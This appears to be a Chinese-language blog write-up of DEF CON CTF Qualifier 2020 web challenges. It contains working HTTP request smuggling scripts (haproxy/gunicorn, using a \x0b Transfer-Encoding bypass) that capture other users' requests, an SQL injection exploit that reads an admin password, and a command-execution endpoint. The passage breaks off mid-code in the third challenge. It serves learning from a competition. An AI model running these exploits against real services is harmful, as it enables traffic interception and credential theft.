<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><title>Defcon_CTF_Qual_2020-Web-WP | xiaoZ's Blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.0/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"><meta name="generator" content="Hexo 4.1.1"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">Defcon_CTF_Qual_2020-Web-WP</h1><a id="logo" href="/.">xiaoZ's Blog</a><p class="description">Try My Best</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Home</i></a><a href="/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/about/"><i class="fa fa-user"> About</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">Defcon_CTF_Qual_2020-Web-WP</h1><div class="post-meta">May 22, 2020<span> | </span><span class="category"><a href="/categories/CTF-writeup/">CTF_writeup</a></span></div><a class="disqus-comment-count" data-disqus-identifier="2020/05/22/Defcon-CTF-Qual-2020-Web-WP/" href="/2020/05/22/Defcon-CTF-Qual-2020-Web-WP/#disqus_thread"></a><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">Contents</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#uploooadit"><span class="toc-number">1.</span> <span class="toc-text">uploooadit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ooonline-Class"><span class="toc-number">2.</span> <span class="toc-text">Ooonline Class</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dogooos"><span class="toc-number">3.</span> <span class="toc-text">Dogooos</span></a></li></ol></div></div><div class="post-content"><p>打了一波<code>defcon qual</code>，不愧为CTF的殿堂级比赛，还是学到了很多新东西的。</p>
<h2 id="uploooadit">uploooadit</h2>
<p>这个题目还是很有意思的，也学到了新姿势，里面涉及了<code>HTTP Smuggling</code>，在这篇文章里就不展开叙述后，后续会补一篇进行详细介绍。</p>
<p>首先对题目给的源码进行分析，题目环境<code>OOO（Order-of-the-Overflow）</code>在<a href="https://github.com/o-o-overflow/dc2020q-uploooadit" target="_blank" rel="noopener">Git</a>中已经给出来了。</p>
<ul>
<li><a href="http://app.py" target="_blank" rel="noopener">app.py</a></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, abort, request</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> store</span><br><span class="line"></span><br><span class="line">GUID_RE = re.compile(</span><br><span class="line">    <span class="string">r"\A[0-9a-f]&#123;8&#125;-[0-9a-f]&#123;4&#125;-[0-9a-f]&#123;4&#125;-[0-9a-f]&#123;4&#125;-[0-9a-f]&#123;12&#125;\Z"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">"MAX_CONTENT_LENGTH"</span>] = <span class="number">512</span></span><br><span class="line">filestore = store.S3Store()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Uncomment the following line for simpler local testing of this service</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># filestore = store.LocalStore()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/files/", methods=["POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.headers.get(<span class="string">"Content-Type"</span>) != <span class="string">"text/plain"</span>:</span><br><span class="line">        abort(<span class="number">422</span>)</span><br><span class="line"></span><br><span class="line">    guid = request.headers.get(<span class="string">"X-guid"</span>, <span class="string">""</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> GUID_RE.match(guid):</span><br><span class="line">        abort(<span class="number">422</span>)</span><br><span class="line"></span><br><span class="line">    filestore.save(guid, request.data)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>, <span class="number">201</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/files/&lt;guid&gt;", methods=["GET"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_file</span><span class="params">(guid)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> GUID_RE.match(guid):</span><br><span class="line">        abort(<span class="number">422</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> filestore.read(guid), &#123;<span class="string">"Content-Type"</span>: <span class="string">"text/plain"</span>&#125;</span><br><span class="line">    <span class="keyword">except</span> store.NotFound:</span><br><span class="line">        abort(<span class="number">404</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/", methods=["GET"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">root</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>, <span class="number">204</span></span><br></pre></td></tr></table></figure>
<ul>
<li><a href="http://store.py" target="_blank" rel="noopener">store.py</a></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">"""Provides two instances of a filestore.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">There is not intended to be any vulnerability contained within this code. This file is provided to</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">make it easier to test locally without needing access to an S3 bucket.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-OOO</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> boto3</span><br><span class="line"><span class="keyword">import</span> botocore</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotFound</span><span class="params">(Exception)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LocalStore</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">import</span> tempfile</span><br><span class="line">        self.upload_directory = tempfile.mkdtemp()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(self, key)</span>:</span></span><br><span class="line">        filepath = os.path.join(self.upload_directory, key)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> open(filepath, <span class="string">"rb"</span>) <span class="keyword">as</span> fp:</span><br><span class="line">                <span class="keyword">return</span> fp.read()</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="keyword">raise</span> NotFound</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save</span><span class="params">(self, key, data)</span>:</span></span><br><span class="line">        <span class="keyword">with</span> open(os.path.join(self.upload_directory, key), <span class="string">"wb"</span>) <span class="keyword">as</span> fp:</span><br><span class="line">            fp.write(data)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S3Store</span>:</span></span><br><span class="line">    <span class="string">"""Credentials grant access only to resource s3://BUCKET/* and only for:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    * GetObject</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    * PutObject</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.bucket = os.environ[<span class="string">"BUCKET"</span>]</span><br><span class="line">        self.s3 = boto3.client(<span class="string">"s3"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(self, key)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = self.s3.get_object(Bucket=self.bucket, Key=key)</span><br><span class="line">        <span class="keyword">except</span> botocore.exceptions.ClientError <span class="keyword">as</span> exception:</span><br><span class="line">            <span class="keyword">if</span> exception.response[<span class="string">"ResponseMetadata"</span>][<span class="string">"HTTPStatusCode"</span>] == <span class="number">403</span>:</span><br><span class="line">                <span class="keyword">raise</span> NotFound</span><br><span class="line">            <span class="comment"># No other exceptions encountered during testing</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> response[<span class="string">"Body"</span>].read()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save</span><span class="params">(self, key, data)</span>:</span></span><br><span class="line">        self.s3.put_object(</span><br><span class="line">            Body=data, Bucket=self.bucket, ContentType=<span class="string">"text/plain"</span>, Key=key</span><br><span class="line">        )</span><br></pre></td></tr></table></figure>
<p>审源码发现，题目可以通过<code>s3://BUCKET/</code>上传文件，并且可以查看文件。于是开始尝试看是否可以查看到一些有用的文件，可以发现文件保存和查看使用的是<code>uuid</code>，于是写脚本读了一些文件，但是发现并没有什么有用的信息。</p>
<p>没啥思路，开始搜集一些其他信息，先看看<code>http</code>报文，发现在<code>response</code>中有一些信息：</p>
<p><img src="/image/202005_defcon/1.png" alt=""></p>
<p><img src="/image/202005_defcon/3.png" alt=""></p>
<p>可以看到这个题使用了<code>haproxy 1.9.10</code>作为代理，并且这里是可以知道题目后端使用的是<code>gunicorn</code>的，谷歌一下，看看是否存在什么漏洞。发现<code>haproxy</code>中有一个<a href="https://nathandavison.com/blog/haproxy-http-request-smuggling" target="_blank" rel="noopener">smuggling的洞</a>,这里也需要再确定一下，这个版本是否有修改这一漏洞，到<code>releases</code>里<a href="https://github.com/benoitc/gunicorn/releases" target="_blank" rel="noopener">可以看到</a>，该漏洞的<code>fix</code>是在20.0.1版本才上的。</p>
<p><img src="/image/202005_defcon/2.png" alt=""></p>
<p>这里再仔细看一下这个利用方式，<code>Smuggling</code>其实是利用了<code>HTTP</code>协议本身的问题：<code>HTTP中</code>存在两种方式来指定请求的结束位置。因此，相同的<code>HTTP</code>请求，不同的服务器可能会产生不同的处理结果，这样就产生了安全风险。</p>
<p>比如你发了一个实际长501的包，前部服务器认为它是501长没错，但是后部服务器却以为它是250。而剩下的251长度呢？它被储存到了服务器的缓存中，当下个http包过来的时候，他就会把那部分剩下的包给加在下个包前面。而这251长拼接进去的包就是http请求走私的包。</p>
<p>而在这个题目中所涉及的<code>haproxy</code>的请求走私，其实是因为<code>haproxy</code>和<code>gunicorn</code>都是遵循<code>RFC2616</code>的实现，<code>haproxy</code>处理的时候是按<code>Content-Length</code>解析的，然后在发往后端<code>gunicorn</code>的时候把<code>Content-Length</code>抛弃了，只留下<code>Transfer-Encoding</code>，从而引发了<code>HTTP Smuggling</code>。</p>
<p>这题的思路，其实就是利用这个请求走私，偷请求流量，这里先写一个脚本跑一下看看能偷到什么：先上传文件，然后用\x0b绕过haproxy的识别。再用一个很长的<code>Content-Length</code>，将第2个请求走私，从而偷到流量，第2个请求就是个简单的文件上传就行了，最后读取第2个请求的<code>guid</code>对应的文件。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">https</span><span class="params">()</span>:</span></span><br><span class="line">    context = ssl.create_default_context()</span><br><span class="line">    data = <span class="string">b'''4</span></span><br><span class="line"><span class="string">abcd</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /files/ HTTP/1.1</span></span><br><span class="line"><span class="string">Host: uploooadit.oooverflow.io</span></span><br><span class="line"><span class="string">X-guid: 99999999-9999-9999-9999-999999999900</span></span><br><span class="line"><span class="string">Content-Type: text/plain</span></span><br><span class="line"><span class="string">Content-Length: 512</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span>.replace(<span class="string">b'\n'</span>, <span class="string">b'\r\n'</span>)</span><br><span class="line">    p = <span class="string">b'''POST /files/ HTTP/1.1</span></span><br><span class="line"><span class="string">Host: uploooadit.oooverflow.io</span></span><br><span class="line"><span class="string">Content-Type: text/plain</span></span><br><span class="line"><span class="string">X-guid: 12345678-9123-4567-8912-1234567890ac</span></span><br><span class="line"><span class="string">Content-Length: '''</span> + str(len(data)).encode() + <span class="string">b'''</span></span><br><span class="line"><span class="string">Transfer-Encoding: \x0cchunked</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">    p = p.replace(<span class="string">b'\n'</span>, <span class="string">b'\r\n'</span>) + data</span><br><span class="line">    <span class="keyword">with</span> socket.create_connection((<span class="string">'uploooadit.oooverflow.io'</span>, <span class="number">443</span>), timeout=<span class="number">5</span>) <span class="keyword">as</span> conn:</span><br><span class="line">        <span class="keyword">with</span> context.wrap_socket(conn, server_hostname=<span class="string">'uploooadit.oooverflow.io'</span>) <span class="keyword">as</span> sconn:</span><br><span class="line">            sconn.send(p) </span><br><span class="line">            sconn.recv(<span class="number">10240</span>).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getone</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">"https://uploooadit.oooverflow.io/files/99999999-9999-9999-9999-999999999900"</span></span><br><span class="line">    res = requests.get(url=url, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>  __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    content = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            https()</span><br><span class="line">            tmpcon = getone()</span><br><span class="line">            <span class="keyword">if</span> content != tmpcon:</span><br><span class="line">                content = tmpcon</span><br><span class="line">                <span class="keyword">with</span> open(<span class="string">'run.log'</span>,<span class="string">'a+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(content + <span class="string">'\n'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>这里跑的时候发现可以偷到各种请求，应该是偷到了别的队伍的，证明这个漏洞的确有用，但是没拿到flag，猜测是因为流量太多了，于是慢慢等，过了很久之后拿到一个流量，里面有一截<code>flag</code>，应该是主办方有设置一个<code>Bot</code>在上传<code>flag</code>文件</p>
<figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line">OOO<span class="comment">&#123;That girl thinks she's the queen of the ne</span></span><br></pre></td></tr></table></figure>
<p>继续跑，但是一直不全，跑了好久后终于拿到了…(后面才发现这个flag里面的内容原来是歌词，其实可以根据<code>Content-Length</code>长度和歌词来猜flag的)</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">OOO&#123;That girl thinks sh<span class="string">e's the queen of the neighborhood/She'</span>s got the hottest trike <span class="keyword">in</span> town/That girl she holds her head up so high/I think I wanna be her best friend, yeah&#125;</span><br></pre></td></tr></table></figure>
<p>这里也给一下官方提供的EXP</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line">import socket</span><br><span class="line">import ssl</span><br><span class="line">import sys</span><br><span class="line">import uuid</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">CLTE_TEMPLATE = <span class="string">""</span><span class="string">"GET / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: &#123;hostname&#125;</span></span><br><span class="line"><span class="string">User-Agent: attacker</span></span><br><span class="line"><span class="string">Content-Length: &#123;length&#125;</span></span><br><span class="line"><span class="string">Transfer-Encoding:\x0bchunked</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">"</span><span class="string">""</span></span><br><span class="line">GUID = str(uuid.uuid4())</span><br><span class="line"></span><br><span class="line">def request(content, hostname, port):</span><br><span class="line">    <span class="builtin-name">print</span>(content)</span><br><span class="line">    <span class="builtin-name">print</span>()</span><br><span class="line"></span><br><span class="line">    def issue_request(server):</span><br><span class="line">        assert server.send(content) == len(content)</span><br><span class="line">        data = server.recv(1024)</span><br><span class="line">        <span class="keyword">while</span> len(data) &gt; 0:</span><br><span class="line">            <span class="builtin-name">print</span>(data.decode(<span class="string">"utf-8"</span>))</span><br><span class="line">            data = server.recv(1024)</span><br><span class="line"></span><br><span class="line">    with socket.create_connection((hostname, port)) as raw_socket:</span><br><span class="line">        <span class="keyword">if</span><span class="built_in"> port </span>== 443:</span><br><span class="line">            context = ssl.create_default_context()</span><br><span class="line">            with context.wrap_socket(raw_socket, <span class="attribute">server_hostname</span>=hostname) as server:</span><br><span class="line">                issue_request(server)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            issue_request(raw_socket)</span><br><span class="line">        try:</span><br><span class="line">            raw_socket.shutdown(socket.SHUT_RDWR)</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line">def clte(payload, hostname):</span><br><span class="line">    offset = 5 + payload.count(<span class="string">"\n"</span>)</span><br><span class="line">    return (</span><br><span class="line">        (CLTE_TEMPLATE.format(<span class="attribute">hostname</span>=hostname, <span class="attribute">length</span>=len(payload) + offset) + payload)</span><br><span class="line">        .replace(<span class="string">"\n"</span>, <span class="string">"\r\n"</span>)</span><br><span class="line">        .encode(<span class="string">"utf-8"</span>)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == 2 <span class="keyword">and</span> sys.argv[1] == <span class="string">"--local"</span>:</span><br><span class="line">        hostname = <span class="string">"localhost"</span></span><br><span class="line">       <span class="built_in"> port </span>= 8080</span><br><span class="line">        url = f<span class="string">"http://localhost:8080/files/&#123;GUID&#125;"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        hostname = <span class="string">"uploooadit.oooverflow.io"</span></span><br><span class="line">       <span class="built_in"> port </span>= 443</span><br><span class="line">        url = f<span class="string">"https://uploooadit.oooverflow.io/files/&#123;GUID&#125;"</span></span><br><span class="line"></span><br><span class="line">    payload = f<span class="string">""</span><span class="string">"POST /files/ HTTP/1.1</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Length: 385</span></span><br><span class="line"><span class="string">Content-Type: text/plain</span></span><br><span class="line"><span class="string">User-Agent: hacked</span></span><br><span class="line"><span class="string">X-guid: &#123;GUID&#125;</span></span><br><span class="line"><span class="string">"</span><span class="string">""</span></span><br><span class="line">    request(clte(payload, hostname), hostname, port)</span><br><span class="line">    response = requests.<span class="builtin-name">get</span>(url)</span><br><span class="line">    <span class="builtin-name">print</span>(response.content.decode(<span class="string">"utf-8"</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sys.exit(main())</span><br></pre></td></tr></table></figure>
<h2 id="Ooonline-Class">Ooonline Class</h2>
<p><a href="https://github.com/o-o-overflow/dc2020q-ooonline-class-public" target="_blank" rel="noopener">题目环境</a>主办方已给出</p>
<p>这题没来得及做，在<code>Dogooos</code>中踩坑踩了半天，等出坑已经快结束了，后续看了下其他师傅的解法，好像题目一出来就有了非预期解，在登录处直接用<code>SQL injection</code>即可拿到<code>smart</code>账号，附上主办方给的<code>EXP</code>:</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line">import json</span><br><span class="line">import random</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">import logging</span><br><span class="line">logging.basicConfig(<span class="attribute">level</span>=logging.DEBUG)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">    host = sys.argv[1]</span><br><span class="line">   <span class="built_in"> port </span>= int(sys.argv[2])</span><br><span class="line"></span><br><span class="line">    url = f<span class="string">"http://&#123;host&#125;:&#123;port&#125;"</span></span><br><span class="line"></span><br><span class="line">    username = f<span class="string">"attack&#123;random.randint(0, 1000000)&#125;"</span></span><br><span class="line">    passwd = <span class="string">"testing"</span></span><br><span class="line"></span><br><span class="line">    exploit_username = f<span class="string">"&#123;username&#125;','&#123;passwd&#125;')returning(id),(select(password)from\"users\"where(id)=1)--"</span></span><br><span class="line"></span><br><span class="line">    result = requests.post(f<span class="string">"&#123;url&#125;/user/register"</span>,</span><br><span class="line">                           <span class="attribute">json</span>=dict(name=exploit_username,</span><br><span class="line">                                     <span class="attribute">passwd</span>=passwd))</span><br><span class="line">    assert result.status_code == 200</span><br><span class="line">    r = result.json()</span><br><span class="line">    admin_pass = r[<span class="string">'returning_from_db_name'</span>]</span><br><span class="line">    assert admin_pass == <span class="string">"zKSTznZYGD"</span></span><br><span class="line"></span><br><span class="line">    username = f<span class="string">"test&#123;random.randint(0, 1000000)&#125;"</span></span><br><span class="line">    passwd = <span class="string">"testing"</span></span><br><span class="line"></span><br><span class="line">    result = requests.post(f<span class="string">"&#123;url&#125;/user/register"</span>,</span><br><span class="line">                           <span class="attribute">json</span>=dict(name=username,</span><br><span class="line">                                     <span class="attribute">passwd</span>=passwd))</span><br><span class="line">    assert result.status_code == 200</span><br><span class="line">    r = result.json()</span><br><span class="line">    assert <span class="string">'id'</span> <span class="keyword">in</span> r</span><br><span class="line"></span><br><span class="line">    result = requests.post(f<span class="string">"&#123;url&#125;/user/login"</span>,</span><br><span class="line">                           <span class="attribute">json</span>=dict(name=username,</span><br><span class="line">                                     <span class="attribute">passwd</span>=passwd))</span><br><span class="line">    assert result.status_code == 200</span><br><span class="line">    r = result.json()</span><br><span class="line">    token = r[<span class="string">'token'</span>]</span><br><span class="line"></span><br><span class="line">    auth_headers = &#123;<span class="string">"X-Auth-Token"</span>: token&#125;</span><br><span class="line"></span><br><span class="line">    done = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> done:</span><br><span class="line">        result = requests.post(f<span class="string">"&#123;url&#125;/assignment/1/submissions"</span>,</span><br><span class="line">                               <span class="attribute">json</span>=dict(file=open('solution.c', <span class="string">'r'</span>).read()),</span><br><span class="line">                               <span class="attribute">headers</span>=auth_headers)</span><br><span class="line">        r = result.json()</span><br><span class="line">        id = r[<span class="string">'id'</span>]</span><br><span class="line"></span><br><span class="line">        time.sleep(4)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">            result = requests.<span class="builtin-name">get</span>(f<span class="string">"&#123;url&#125;/submission/&#123;id&#125;/result"</span>,</span><br><span class="line">                                  <span class="attribute">headers</span>=auth_headers)</span><br><span class="line">            r = result.json()</span><br><span class="line">            <span class="builtin-name">print</span>(r)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'retry'</span> <span class="keyword">in</span> r:</span><br><span class="line">                time.sleep(4)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'Success'</span> <span class="keyword">in</span> r[<span class="string">'message'</span>]:</span><br><span class="line">                    <span class="builtin-name">print</span>(r[<span class="string">'message'</span>][9:])</span><br><span class="line">                    sys.exit(0)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="builtin-name">print</span>(<span class="string">'trying again'</span>)</span><br><span class="line">                    break</span><br><span class="line"></span><br><span class="line">    sys.exit(-1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h2 id="Dogooos">Dogooos</h2>
<p><code>fstring</code>的格式化字符串漏洞，<a href="https://github.com/o-o-overflow/dc2020q-dogooos-public" target="_blank" rel="noopener">题目环境</a>也已经给出。</p>
<p>题目是给了源码的，先对源码进行审计，这题实际上是有个坑的，在<code>dogooo_comments.py</code>中有这么一段，天真的以为是命令执行，饶了半天waf，但是一直没用…(赛后看了一下，发现官方给了这么一个note 2333：Although there was a promising route in the script for executing local commands /runcmd. It would error because of the seccomp filter which prevented execve.)</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">@app.route(<span class="string">"/dogooo/runcmd"</span>, methods=[<span class="string">"GET"</span>,<span class="string">"POST"</span>])</span><br><span class="line">def run_cmd():</span><br><span class="line">    cmd = request.form.get(<span class="string">'cmd'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cmd <span class="keyword">or</span> cmd == <span class="string">""</span>:</span><br><span class="line">        cmd = <span class="string">"ls -la /tmp"</span>.split(<span class="string">" "</span>)</span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">"here &#123;cmd&#125;"</span>)</span><br><span class="line">    import subprocess</span><br><span class="line">    p = subprocess.Popen(cmd, <span class="built_in">stdout</span>=subprocess.PIPE, <span class="built_in">stderr</span>=subprocess.PIPE)</span><br><span class="line">    <span class="built_in">stdout</span>, <span class="built_in">stderr</span> = p.communicate()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"STDOUT:"</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">stdout</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">stdout</span></span><br></pre></td></tr></table></figure>
<p>后面再想是否不是命令绕过，或者是否有什么没注意到的，于是继续审代码，发现在<code>loaddata.py</code>中有两处使用了<code>fstring</code>：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">from fstring import fstring as f</span><br><span class="line">······</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>(<span class="title">UserMixin</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>, id, username, password)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.id = id</span><br><span class="line">        <span class="keyword">self</span>.username = username</span><br><span class="line">        <span class="keyword">self</span>.password = password</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"%d/%s/%s"</span> % (<span class="keyword">self</span>.id, <span class="keyword">self</span>.username, <span class="keyword">self</span>.password)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_user_info</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> f(<span class="keyword">self</span>.username)</span><br><span class="line"></span><br><span class="line">······</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Post</span>(<span class="title">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>, id, message, rating, pic_loc)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.id = id</span><br><span class="line">        <span class="keyword">self</span>.rating = rating</span><br><span class="line">        <span class="keyword">self</span>._message = message</span><br><span class="line">        <span class="keyword">self</span>.pic_loc = pic_loc</span><br><span class="line">        <span class="keyword">self</span>.author = <span class="string">""</span></span><br><span class="line">        <span class="keyword">self</span>.comments = list()</span><br><span class="line"></span><br><span class="line">    @property</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">message</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">self</span>._message</span><br><span class="line"></span><br><span class="line">    @message.setter</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">message</span><span class="params">(<span class="keyword">self</span>, msg)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>._message = msg</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_comment</span><span class="params">(<span class="keyword">self</span>, comment, commenter, preview=False)</span></span><span 